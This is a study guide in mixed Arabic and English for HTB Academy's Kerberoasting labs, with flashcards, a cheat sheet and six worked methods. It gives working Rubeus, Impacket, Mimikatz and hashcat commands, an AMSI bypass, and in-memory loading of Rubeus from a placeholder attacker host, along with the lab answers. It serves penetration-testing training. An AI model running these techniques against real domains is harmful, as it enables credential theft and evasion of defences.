بالاختبارات الحقيقية، إذا حصلت باسورد `sqldev` واكتشفت إنه مو `Domain Admin` (عكس ما ظهر بهذا السكشن المبسط)، هل انتهى الهجوم؟ لا. السكشن يشرحلك إن هذا يوزر يشغل خدمة `MSSQL`. معناها تكدر تفتح برنامج إدارة قواعد البيانات، تتصل بالسيرفر بالباسورد الجديد، وتفعل ميزة `xp_cmdshell`، وتنفذ أوامر (RCE) على السيرفر كـ Local System! يعني الـ Kerberoasting دائماً يفتحلك باب، سواء للسيرفر نفسه أو للشبكة كلها.

🏆 **النصيحة الذهبية للـ CPTS Exam:**

بامتحان الـ CPTS، من تلقى SPN Accounts، **لا تضيع وقتك الثمين في كسر حسابات عادية بكلمات سر معقدة جداً**. الامتحان مصمم بحيث الحساب اللي المفروض تكسره، راح ينكسر بسرعة بملف `rockyou.txt` أو بـ `Custom Wordlist` أنت جمعته من الموقع مال الشركة (عن طريق CeWL). إذا طول الكسر، راجع نفسك، ممكن دا تستهدف الحساب الغلط.

━━━━━

## 💎 الفلاشكاردز — ملخص السكشن للحفظ

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #1

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو الغرض الأساسي من استخدام أداة `GetUserSPNs.py` في بيئة Linux؟

✅ Back: استكشاف حسابات الـ SPNs وطلب تذاكر الـ TGS الخاصة بها (TGS-REQ/REP) وحفظها بتنسيق جاهز للكسر من نظام لينكس غير مرتبط بالدومين.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #2

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو الشرط الأساسي الذي يجب أن تملكه قبل تنفيذ هجوم Kerberoasting باستخدام Impacket؟

✅ Back: يجب أن تمتلك بيانات اعتماد صالحة (اسم مستخدم وكلمة مرور/أو NTLM Hash) لأي حساب نطاق عادي (Standard Domain User) وعنوان الـ DC.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #3

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: في مخرجات أداة `GetUserSPNs.py`، أي عمود يعتبر الأكثر أهمية لتحديد الأهداف ذات القيمة العالية (High Value Targets)؟

✅ Back: عمود `MemberOf`، لأنه يوضح المجموعات التي ينتمي إليها الحساب (مثل Domain Admins)، مما يحدد مدى خطورة وتأثير اختراقه.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #4

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ماذا تفعل راية (Flag) `-outputfile` ولماذا هي مهمة؟

✅ Back: تقوم بحفظ تذاكر الـ TGS المسحوبة في ملف نصي نظيف ومُنَسّق بدلاً من طباعتها على الشاشة، مما يمنع أخطاء التنسيق (الفراغات والأسطر) عند نقلها لبرنامج Hashcat.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #5

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو رقم الوضع (`-m`) في برنامج Hashcat المخصص لكسر تذاكر Kerberos 5 TGS-REP بتشفير RC4 (التي تبدأ بـ `$krb5tgs$23$`)؟

✅ Back: الوضع هو `13100`.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #6

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: عند التحقق من الصلاحيات بأداة `CrackMapExec`، ماذا تعني الكلمة `(Pwn3d!)` بجانب النتيجة الخضراء؟

✅ Back: تعني أن الحساب المخترق يمتلك صلاحيات مسؤول محلي (Local Administrator) على السيرفر المستهدف (وإذا كان الهدف هو الـ DC، فأنت Domain Admin).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #7

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو الخطأ الشائع `Clock skew too great` الذي يظهر عند استخدام أدوات Impacket لطلب التذاكر؟

✅ Back: يظهر عندما يكون فارق الوقت بين جهاز المهاجم (Linux) وجهاز التحكم بالمجال (Domain Controller) أكثر من 5 دقائق، مما يكسر بروتوكول Kerberos.

━━━━━

## 📄 ورقة غش السكشن — للسكرين شوت

🛑 هذه ورقة غش مخصصة لسكشن (Kerberoasting - from Linux) للرجوع إليها سريعاً أثناء اللاب.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📄 ورقة غش: Kerberoasting من بيئة اللينكس (Impacket)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 **هدف هذا السكشن بجملة:**

القدرة على استكشاف، وسحب، وكسر تذاكر حسابات الخدمات (SPN) من بيئة لينكس (غير مرتبطة بالدومين) باستخدام حساب مستخدم عادي وحزمة Impacket.

⚔️ **خوارزمية التطبيق (فكر هكذا باللاب خطوة بخطوة):**

1. **تزامن الوقت:** تأكد من أن وقت اللينكس يطابق الـ DC (تجنباً لخطأ Clock Skew).
    
2. **الاستطلاع:** شغل `GetUserSPNs.py` بدون `-request` لاستكشاف الأهداف.
    
3. **التقييم:** ابحث في عمود `MemberOf` عن حسابات إدارية (Admins).
    
4. **السحب:** اسحب تذاكر الحسابات المهمة فقط باستخدام `-request-user` واحفظها بـ `-outputfile`.
    
5. **الكسر:** استخدم `Hashcat` مع قاموس قوي (rockyou) لكسر الهاش.
    
6. **التحقق:** تأكد من عمل الباسورد وصلاحياته باستخدام `CrackMapExec` (NetExec).
    

📐 **جدول الأوامر الأساسية لهذا السكشن:**

|**الهدف**|**الأمر**|**ملاحظة**|
|---|---|---|
|**الاستطلاع (معرفة الأهداف)**|`GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>`|يطلب الباسورد. يظهر جدول الحسابات وصلاحياتها.|
|**سحب كل التذاكر (لا ينصح به)**|`GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request -outputfile hashes.txt`|يسحب تذاكر كل الحسابات (Noise عالي جداً).|
|**سحب تذكرة محددة (موصى به)**|`GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request-user <TARGET_USER> -outputfile hashes.txt`|دقيق وصامت. استبدل `TARGET_USER` باسم الهدف (مثال sqldev).|
|**كسر الهاش (TGS-REP RC4)**|`hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt`|يحول التذكرة المشفرة إلى باسورد Cleartext.|
|**التحقق من الصلاحيات (CME)**|`crackmapexec smb <DC_IP> -u <USER> -p <PASSWORD>`|ابحث عن كلمة `(Pwn3d!)` كدليل على اختراق السيرفر.|

🔢 **قيم وثوابت مهمة:**

- **`13100`**: هوية وضع (Mode) التشفير RC4 TGS-REP بـ Hashcat.
    
- **`$krb5tgs$23$`**: بادئة الهاش الذي يمثل تشفير RC4 القديم والضعيف (الأسهل في الكسر).
    

🚨 **الفخوخ الخاصة بهذا السكشن:**

❌ **فخ 1 (مشكلة الـ DNS):** فشل السكربت بالرغم من صحة الباسورد. (الحل: أضف الـ IP واسم الدومين في ملف `/etc/hosts`).

❌ **فخ 2 (الوقت):** فشل الكيربروس بسبب الـ Clock Skew. (الحل: استخدم `sudo ntpdate <DC_IP>` أو اضبط وقت الكالي يدوياً).

❌ **فخ 3 (تضييع الوقت):** محاولة كسر باسوردات حسابات الكمبيوتر التي تنتهي بـ `$` (لن تنكسر أبداً لأنها عشوائية ومكونة من 120 حرف).

💡 **Golden Tip:**

إذا قمت بكسر حساب يملك SPN ولم يكن `Domain Admin`، تذكر أن الهجوم لم يفشل! هذا الحساب يملك صلاحية على السيرفر الخاص بالخدمة التي يشغلها (مثلاً SQL). يمكنك تسجيل الدخول إلى تلك الخدمة ومحاولة تنفيذ هجوم (RCE) على السيرفر كخطوة تالية.

━━━━━

بهيج خلصنا. هسة عندك:

✅ ليش هذا الموضوع موجود (Big Picture)

✅ كل المصطلحات الجديدة بالسكشن

✅ كيف السكشن مبني وشنو يبي يعلمك

✅ الشرح العميق لكل مفهوم بأمثلة وتشبيهات

✅ ما لم يقله HTB (الـ gotchas والثغرات بالشرح)

✅ فلاشكاردز السكشن

✅ ورقة غش مخصصة للـ lab

الآن ارجع اقرأ نص السكشن الأصلي بـ HTB — وراح تلاحظ إن كل جملة صارت واضحة وإن فاهم ليش موجودة. بالتوفيق! 💪]

```text
══════════════════════════════════════════════════════════════════
[✓] PHASE_I EXTRACTION COMPLETE
[✓] THEORETICAL FRAMEWORK LOADED INTO MEMORY
[→] TRANSITIONING TO LIVE CHALLENGE ENVIRONMENT . . .
══════════════════════════════════════════════════════════════════
```

## 🎯 PHASE_II — حقل التدريب :: السؤال وطرق الحل الستة

> [!success] ☣️ PHASE II INITIALIZED · LIVE CHALLENGE ENVIRONMENT
> **Language:** English — **Size:** ~2,000 Words
> **Content:** Official HTB question · Lab target setup · 6 attack methods against live infrastructure.

[# 🔐 Kerberoasting from Windows — Complete Beginner's Guide (HTB Academy)

---

# 1. THE QUESTION & SYSTEMATIC THOUGHT PROCESS

## Re-stating the Question (In Simple Terms)

You are asked to:
1. Connect to a Windows machine inside an Active Directory (AD) domain
2. **Find the name of a service account** that has a specific label registered in the domain called an **SPN** (Service Principal Name) — specifically `vmware/inlanefreight.local`
3. **Steal its encrypted ticket** from Kerberos (the domain's authentication system)
4. **Crack that ticket offline** to reveal the service account's plaintext password

---

## 🧠 The Underlying Concepts (Zero Knowledge Assumed)

<details>
<summary><strong>📚 Click to expand: What is Active Directory?</strong></summary>

Active Directory (AD) is like a **giant directory book** for a company's network. It stores information about:
- **Users** (employees, admins, service accounts)
- **Computers** (workstations, servers)
- **Permissions** (who can access what)

Most corporate networks run on AD. Hacking AD is a core skill for CPTS.

</details>

<details>
<summary><strong>📚 Click to expand: What is Kerberos?</strong></summary>

Kerberos is Microsoft's **authentication protocol** used inside AD. Think of it like a theme park:

| Theme Park | Kerberos Equivalent |
|---|---|
| You buy a day pass at the gate | You log in → get a **TGT** (Ticket Granting Ticket) |
| You show your pass to get a ride ticket | You show TGT → get a **TGS** (Ticket Granting Service) |
| You show the ride ticket to board | You show TGS → access the service |

The **TGS ticket** is **encrypted with the service account's password hash**. That is the vulnerability.

</details>

<details>
<summary><strong>📚 Click to expand: What is an SPN?</strong></summary>

A **Service Principal Name (SPN)** is a unique identifier that links a service (like a web server, SQL database, or VMware) to the **domain account** running that service.

**Example:**
```
vmware/inlanefreight.local
    ^          ^
  Service    Domain
```

When a service **account** has an SPN registered, it becomes **Kerberoastable** — meaning we can request its encrypted service ticket without needing special privileges.

</details>

---

## 🎯 What is Kerberoasting? (The Attack Explained)

```
[Attacker as Domain User]
        |
        | 1. "Hey Domain Controller, give me a TGS for vmware/inlanefreight.local"
        ↓
[Domain Controller]
        |
        | 2. "Sure! Here's a ticket ENCRYPTED with svc_vmware's password hash"
        ↓
[Attacker receives encrypted .kirbi ticket]
        |
        | 3. Takes ticket OFFLINE and runs dictionary attack
        ↓
[Hashcat cracks it]
        |
        | 4. Recovers plaintext password!
```

> **Why does this work?** Any authenticated domain user can request service tickets. The DC doesn't check *why* you need it. This is by design — the weakness is that old RC4 encryption is used to protect the ticket, making it crackable.

---

## 🔑 Fundamental Justification

We use **Rubeus** as the primary tool because:
- It's purpose-built for Kerberos abuse on Windows
- It runs entirely in memory (no files dropped to disk)
- The `/stats` flag lets us enumerate before attacking
- It outputs hashes in **Hashcat-ready format** automatically

---

# 2. SIX DISTINCT SOLUTION APPROACHES

## 🔧 Pre-flight: Connect to the Target

**From your Linux/Kali attack machine:**
```bash
xfreerdp /v:TARGET_IP /u:htb-student /p:Academy_student_AD! /dynamic-resolution /drive:.,/tmp
```

**Parameter breakdown:**

| Flag | Meaning |
|---|---|
| `/v:TARGET_IP` | The IP of the Windows machine |
| `/u:htb-student` | Username |
| `/p:Academy_student_AD!` | Password |
| `/dynamic-resolution` | Allows resizing the window |
| `/drive:.,/tmp` | Shares your Linux `/tmp` folder into Windows (for file transfer) |

Once connected, **open a CMD or PowerShell window** and navigate to the tools directory:
```cmd
cd C:\Tools
```

---

## Approach 1 — Rubeus `/stats` Flag (Enumerate First)

### Purpose
Before attacking, **gather intelligence**. The `/stats` flag shows you all Kerberoastable accounts without actually requesting any tickets.

```cmd
.\Rubeus.exe kerberoast /stats
```

### ✅ Expected Output

```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Kerberoasting Statistics

[*] Available krbtgt                  : 0
[*] Available service accounts        : 3

ServiceName            : svc_vmware
SPN                    : vmware/inlanefreight.local
EncryptionType         : RC4_HMAC (weak - crackable!)
PwdLastSet             : 9/13/2021 6:02:16 AM
...
```

> **Answer to Question 1 found here!** The `ServiceName` field next to `vmware/inlanefreight.local` reveals: **`svc_vmware`**

### ❌ Failure Scenarios

| Failure | Cause |
|---|---|
| `Access Denied` | Your user account `htb-student` isn't authenticated to the domain yet |
| `Rubeus.exe not found` | Wrong directory — try `C:\Tools\Rubeus.exe` |
| AV blocks execution | Windows Defender quarantines Rubeus |

### 🔄 Pivot Trigger
Stop and move on if you see **"Access Denied"** or the command hangs for more than 30 seconds with no output.

---

## Approach 2 — Rubeus Full Kerberoast (Request & Extract Ticket)

### Purpose
Request the actual TGS ticket for cracking. The `/nowrap` flag prevents the hash from being line-wrapped (important for hashcat).

```cmd
.\Rubeus.exe kerberoast /nowrap
```

### ✅ Expected Output

```
[*] Total kerberoastable users : 3

[*] SamAccountName         : svc_vmware
[*] DistinguishedName      : CN=svc_vmware,OU=Service Accounts,...
[*] ServicePrincipalName   : vmware/inlanefreight.local
[*] PwdLastSet             : 9/13/2021 6:02:16 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   :

$krb5tgs$23$*svc_vmware$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local*$A8D3F...(very long hash)...9E4B
```

**Save this hash to a file!**
```cmd
.\Rubeus.exe kerberoast /nowrap > C:\Temp\hashes.txt
```

Then transfer to your Linux machine for cracking:
```bash
# On Linux (if you used /drive flag):
cp /tmp/hashes.txt ~/Desktop/hashes.txt
```

### Then Crack with Hashcat

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Hashcat mode explanation:**

| Mode | Type |
|---|---|
| `-m 13100` | Kerberos 5 TGS-REP etype 23 **(RC4 — most crackable)** |
| `-m 19600` | Kerberos 5 TGS-REP etype 17 (AES-128) |
| `-m 19700` | Kerberos 5 TGS-REP etype 18 (AES-256) |

### ✅ Hashcat Expected Output

```
$krb5tgs$23$*svc_vmware$...hash...*:virtualpc1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Time.Started.....: Fri Jul 31 10:00:00 2026
Recovered........: 1/1 (100.00%) Digests
```

> **Answer to Question 2:** The cracked password is **`virtualpc1`**

### ❌ Failure Scenarios

| Failure | Cause |
|---|---|
| Hash mode wrong | AES-256 tickets need `-m 19700`, not `13100` |
| rockyou.txt missing | Install with: `sudo apt install wordlists && gunzip /usr/share/wordlists/rockyou.txt.gz` |
| No GPU available | Add `--force` flag but expect very slow cracking |

### 🔄 Pivot Trigger
If Hashcat shows `Exhausted` after rockyou.txt completes, move to Approach 6 (rule-based cracking).

---

## Approach 3 — PowerView + `Invoke-Kerberoast` (PowerShell Route)

### Purpose
Use PowerShell and the PowerView module — a classic AD enumeration tool.

```powershell
# First, import PowerView
Import-Module C:\Tools\PowerView.ps1

# Enumerate all accounts with SPNs
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Run Kerberoast and get hashes
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File C:\Temp\pv_hashes.txt
```

### ✅ Expected Output (Enumeration)

```
samaccountname   serviceprincipalname
--------------   --------------------
sqldev           MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
svc_vmware       vmware/inlanefreight.local
backupagent      backupjob/veam.inlanefreight.local:4444
```

### ❌ Failure Scenarios

| Failure | Cause |
|---|---|
| `Execution Policy` error | Run: `Set-ExecutionPolicy Bypass -Scope Process` |
| Module not found | Confirm path: `C:\Tools\PowerView.ps1` |
| AV flags PowerView | Try AMSI bypass or use Rubeus instead |

### 🔄 Pivot Trigger
If PowerShell execution is blocked and you cannot bypass it, switch to Rubeus (Approach 2).

---

## Approach 4 — Mimikatz (Extract Tickets from Memory)

### Purpose
Mimikatz can extract Kerberos tickets **already stored in memory** (LSASS process). This finds tickets for services you've already authenticated to.

```cmd
# Run as Administrator
.\mimikatz.exe

# Inside Mimikatz:
privilege::debug
sekurlsa::tickets /export
```

### ✅ Expected Output

```
mimikatz # sekurlsa::tickets /export

Authentication Id : 0 ; 291923 (00000000:00047453)
Session           : Interactive from 1
User Name         : htb-student
Domain            : INLANEFREIGHT
...
* [0] - 0x17 - rc4_hmac_nt
     Start/End/MaxRenew: 7/31/2026 10:00:00 ...
     Service Name (02) : vmware ; inlanefreight.local
     Target Name  (02) : vmware ; inlanefreight.local
     Client Name  (01) : htb-student ; @ INLANEFREIGHT.LOCAL

  [Saving 0-40a10000-htb-student@vmware~inlanefreight.local-INLANEFREIGHT.LOCAL.kirbi]
```

The `.kirbi` files are exported to the current directory. Convert them:
```cmd
kerberos::list /export
```

Then convert `.kirbi` → hashcat format on Linux:
```bash
python3 kirbi2hashcat.py ticket.kirbi > hash.txt
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

### ❌ Failure Scenarios

| Failure | Cause |
|---|---|
| `kuhl_m_privilege_debug ; RtlAdjustPrivilege (20) c0000061` | Not running as admin — right-click → "Run as Administrator" |
| No tickets found | No services have been authenticated to yet (memory is empty) |
| Mimikatz detected | Windows Defender blocks it — use Rubeus instead |

### 🔄 Pivot Trigger
If you're not local admin on this box, Mimikatz will fail. Switch to Rubeus which doesn't require admin.

---

## Approach 5 — `setspn.exe` (Built-in Windows Binary)

### Purpose
`setspn.exe` is a **native Windows command** — no tools needed! It queries the domain for SPN registrations.

```cmd
# List all SPNs in the domain
setspn -T inlanefreight.local -Q */*

# Directly query the specific SPN
setspn -Q vmware/inlanefreight.local
```

### ✅ Expected Output

```
Checking domain DC=inlanefreight,DC=local

CN=svc_vmware,OU=Service Accounts,OU=Corp,DC=inlanefreight,DC=local
        vmware/inlanefreight.local

Existing SPN found!
```

> **This directly answers Question 1:** The CN (Common Name) = **`svc_vmware`**

### ❌ Failure Scenarios

| Failure | Cause |
|---|---|
| `Cannot find domain` | Machine is not domain-joined or DNS is broken |
| Empty result | SPN may not exist or you mis-typed it |
| Only enumerates, can't extract hash | `setspn` cannot request tickets — you still need Rubeus/PowerView for the hash |

### 🔄 Pivot Trigger
`setspn` only enumerates. It cannot extract ticket hashes. Always pair with Rubeus for the actual attack.

---

## Approach 6 — Active Directory PowerShell Module

### Purpose
Use Microsoft's official AD module to query service accounts — stealthier than third-party tools.

```powershell
# Import if not auto-loaded
Import-Module ActiveDirectory

# Find all accounts with SPNs
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | 
    Select-Object Name, SamAccountName, ServicePrincipalName

# Find the specific SPN
Get-ADUser -Filter {ServicePrincipalName -eq "vmware/inlanefreight.local"} -Properties ServicePrincipalName
```

### ✅ Expected Output

```
Name          : svc_vmware
SamAccountName: svc_vmware
ServicePrincipalName: {vmware/inlanefreight.local}

DistinguishedName : CN=svc_vmware,OU=Service Accounts,...
Enabled           : True
```

### ❌ Failure Scenarios

| Failure | Cause |
|---|---|
| Module not found | Run: `Install-WindowsFeature RSAT-AD-PowerShell` or it may not be installed |
| `Get-ADUser` not recognized | RSAT tools absent — use PowerView instead |

### 🔄 Pivot Trigger
If the AD module isn't installed and you can't install it, fall back to PowerView (Approach 3).

---

# 3. THE "WHAT IF" MASTERCLASS

## 🎓 Scenario 1: What if Rubeus is not on the target machine?

**Situation:** You RDP in but `C:\Tools\Rubeus.exe` doesn't exist.

**Solution — Transfer Rubeus from your attack machine:**
```bash
# On your Kali machine, start a Python HTTP server
cd /opt/tools && python3 -m http.server 8080
```
```powershell
# On the Windows target
certutil.exe -urlcache -split -f http://YOUR_KALI_IP:8080/Rubeus.exe C:\Temp\Rubeus.exe
```

Or use PowerShell:
```powershell
Invoke-WebRequest -Uri http://YOUR_KALI_IP:8080/Rubeus.exe -OutFile C:\Temp\Rubeus.exe
```

> **Key concept:** Using `certutil.exe` is a **LOLBin** (Living off the Land Binary) — a built-in Windows tool abused for file download. This is stealthier than uploading tools.

---

## 🎓 Scenario 2: What if the ticket is encrypted with AES-256 instead of RC4?

**Situation:** The hash starts with `$krb5tgs$18$` instead of `$krb5tgs$23$`, meaning it uses AES-256 — much harder to crack.

**Solution — Force RC4 downgrade with Rubeus:**
```cmd
.\Rubeus.exe kerberoast /tgtdeleg /nowrap
```

Or target specifically:
```cmd
.\Rubeus.exe kerberoast /rc4opsec /nowrap
```

**For cracking AES tickets, change Hashcat mode:**
```bash
# AES-128 (etype 17)
hashcat -m 19600 hashes.txt /usr/share/wordlists/rockyou.txt

# AES-256 (etype 18)  
hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt
```

> **Why it matters:** AES-256 tickets take **exponentially longer** to crack. On a GPU with rockyou.txt, RC4 takes seconds; AES-256 takes days. If forced to crack AES, use GPU rigs or cloud cracking (e.g., Hashtopolis).

---

## 🎓 Scenario 3: What if rockyou.txt fails to crack the password?

**Situation:** Hashcat shows `Status: Exhausted` — the password is not in rockyou.txt.

**Solution — Use rules-based cracking:**
```bash
# Use Hashcat rules (transforms wordlist: adds numbers, symbols, capitalizes, etc.)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Try corporate password patterns
hashcat -m 13100 hashes.txt -a 3 ?u?l?l?l?l?d?d?d?s
```

**Build a custom wordlist based on company name:**
```bash
# CeWL scrapes words from the company website
cewl https://inlanefreight.local -d 2 -m 5 -w custom_wordlist.txt

hashcat -m 13100 hashes.txt custom_wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

> **Password spraying intuition:** Service accounts often follow patterns like `Company@2021!`, `VMware123!`, `Service#2022`. The rule engine mutates rockyou.txt entries to match these patterns.

---

## 🎓 Scenario 4: What if Windows Defender blocks all your tools?

**Situation:** Defender flags Rubeus, Mimikatz, and PowerView immediately upon execution.

**Solution — AMSI Bypass + Obfuscation:**

```powershell
# AMSI Bypass (run this FIRST before importing any tools)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Or use obfuscated Rubeus:
```powershell
# Load Rubeus directly into memory from remote server (never touches disk)
$data = (New-Object Net.WebClient).DownloadData('http://KALI_IP/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::MainString("kerberoast /nowrap")
```

Or use the built-in `setspn.exe` + manual ticket request via PowerShell (no third-party tools):
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "vmware/inlanefreight.local"
```

---

## 🎓 Scenario 5: What if you need to do this from Linux instead of Windows?

**Situation:** You cannot RDP, but you have domain credentials. You want to Kerberoast remotely.

**Solution — Impacket from Linux:**
```bash
# Install impacket
pip3 install impacket

# Kerberoast remotely (no Windows needed!)
GetUserSPNs.py inlanefreight.local/htb-student:Academy_student_AD! -dc-ip TARGET_DC_IP -request

# Save to file
GetUserSPNs.py inlanefreight.local/htb-student:Academy_student_AD! -dc-ip TARGET_DC_IP -request -outputfile linux_hashes.txt
```

### ✅ Expected Output
```
ServicePrincipalName          Name          MemberOf           PasswordLastSet
----------------------------  ------------  -----------------  -------------------
vmware/inlanefreight.local    svc_vmware    Domain Users       2021-09-13 06:02:16

$krb5tgs$23$*svc_vmware$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local*$...(hash)...
```

Then crack exactly the same way with Hashcat.

---

## 🎓 Scenario 6: What if the /stats flag shows 0 Kerberoastable accounts?

**Situation:** You run `Rubeus.exe kerberoast /stats` and it shows no results.

**Possible reasons and solutions:**

| Cause | Solution |
|---|---|
| You're not authenticated to the domain | Run `whoami /fqdn` — if it shows a domain, you're good. If not, use `runas /netonly` |
| Domain controller is unreachable | Run `nltest /dclist:inlanefreight.local` to check DC connectivity |
| Accounts have no SPNs registered | The target may require a different attack (ASREPRoasting, password spraying) |
| Accounts require AES only (msDS-SupportedEncryptionTypes set to AES only) | Use `/tgtdeleg` flag with Rubeus to downgrade |

**Check domain connectivity:**
```cmd
nltest /dclist:inlanefreight.local
ping inlanefreight.local
nslookup inlanefreight.local
```

**Verify you're domain-joined:**
```cmd
whoami /all
echo %USERDOMAIN%
```

---

# 📋 Complete Attack Summary

```
┌─────────────────────────────────────────────────────────────┐
│              KERBEROASTING FROM WINDOWS - FLOW              │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. RDP into target:                                        │
│     xfreerdp /v:IP /u:htb-student /p:Academy_student_AD!   │
│                                                             │
│  2. Enumerate (find Q1 answer):                             │
│     Rubeus.exe kerberoast /stats                            │
│     → Look for SPN "vmware/inlanefreight.local"             │
│     → Service name = svc_vmware  ✅  (Q1 Answer)           │
│                                                             │
│  3. Extract ticket hash:                                    │
│     Rubeus.exe kerberoast /nowrap > hashes.txt              │
│                                                             │
│  4. Transfer to Linux attack machine                        │
│                                                             │
│  5. Crack with Hashcat:                                     │
│     hashcat -m 13100 hashes.txt rockyou.txt                 │
│     → Cracked password = virtualpc1  ✅  (Q2 Answer)       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

> **⚠️ Legal Reminder:** All techniques described here are for **authorized penetration testing** and **CTF/lab environments only**. Always have written permission before testing any system. HTB Academy labs provide this authorization.]

```text
══════════════════════════════════════════════════════════════════
[✓] PHASE_II ATTACK SEQUENCES DOCUMENTED
[✓] 6 / 6 EXPLOITATION METHODS CAPTURED
[→] LOADING DEEP-DIVE ANALYSIS & GLOSSARY . . .
══════════════════════════════════════════════════════════════════
```

## 🔴 PHASE_III — دليل الاختراق :: التحليل والمصطلحات

> [!success] ⚠️ PHASE III INITIALIZED · EXPLOITATION GUIDE & GLOSSARY
> **Language:** Arabic + English Mixed — **Size:** ~2,000 Words
> **Content:** Arabic breakdown of all 6 methods · Flashcards · Cheat Sheet · Golden Tips.

[تمام! استلمت التحدي. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 المصطلحات → 🟡 تحليل التحدي → 🟠 الاستغلال → 🔴 ماذا لو → 💎 فلاشكاردز → 📄 ورقة غش

يله نبدأ...

━━━━━

🟢 المرحلة 0: ما قبل الصفر — Big Picture

⚠️ ركز وياي هنا كلش زين، لأن إذا فهمت هذي القصة، الأوامر راح تصير مجرد تحصيل حاصل وتطبع ببالك للأبد.

تخيل وياي إنك رحت لمدينة ملاهي ضخمة جداً (هذي المدينة هي الـ Active Directory أو شبكة الشركة). بهذي المدينة، اكو نظام أمني معقد حتى يتأكدون إن كل شخص يركب اللعبة المناسبة إله. هذا النظام الأمني اسمه Kerberos.

قديماً، بالشبكات القديمة، جان اليوزر كلما يريد يدخل لخدمة (مثلاً يفتح ملفات مشتركة، أو يدخل لقاعدة بيانات)، يرسل الباسورد مالته بالشبكة. هذا جان كارثة، لأن أي هكر كاعد يتصنت على الشبكة راح يسرق الباسورد. فاجوي المهندسين وسووا بروتوكول Kerberos حتى يحلون هالمشكلة، وقالوا: "بعد محد يرسل باسوردات، راح نستخدم نظام التذاكر!".

شلون يشتغل نظام التذاكر بمدينة الملاهي (Kerberos)؟

1. أنت تدخل من باب الملاهي الرئيسي (تسوي Login حاسبتك الصبح). تروح لشباك التذاكر الرئيسي (اسمه Domain Controller) وتثبت هويتك (بالباسورد).
    
2. الشباك الرئيسي راح يعطيك "تذكرة دخول يومية" (TGT - Ticket Granting Ticket). هاي التذكرة تكول: "هذا الشخص معروف وعدنا وموثوق، خلوه يفتر بالمدينة".
    
3. هسة أنت تريد تركب لعبة "قطار الموت" (اللعبة تمثل خدمة بالشبكة، مثلاً سيرفر قواعد بيانات SQL أو سيرفر VMware). ما تروح تنطي الباسورد مالتك لعامل القطار! لا.
    
4. ترجع مرة ثانية لشباك التذاكر، تنطيهم تذكرة الدخول اليومية مالتك (TGT) وتكول: "أريد تذكرة مخصصة للعبة قطار الموت".
    
5. الشباك (Domain Controller) راح يطبعلك تذكرة خاصة للعبة (TGS - Ticket Granting Service).
    

وهنا تكمن الكارثة والثغرة الجوهرية اللي راح نستغلها:

كيف يضمن عامل قطار الموت (الخدمة) إن التذكرة اللي انطيتها إياه مو مزورة؟

الـ Domain Controller من يطبعلك التذكرة (TGS)، يقوم بتشفيرها باستخدام "كلمة المرور الخاصة بعامل قطار الموت نفسه" (Service Account Password)! العامل من يستلم التذكرة منك، يحاول يفتحها بالباسورد مالته، إذا انفتحت، يعني التذكرة أصلية ومطبوعة من الإدارة.

شنو الخلل الجوهري (The Vulnerability) اللي راح نستغله بهجوم Kerberoasting؟

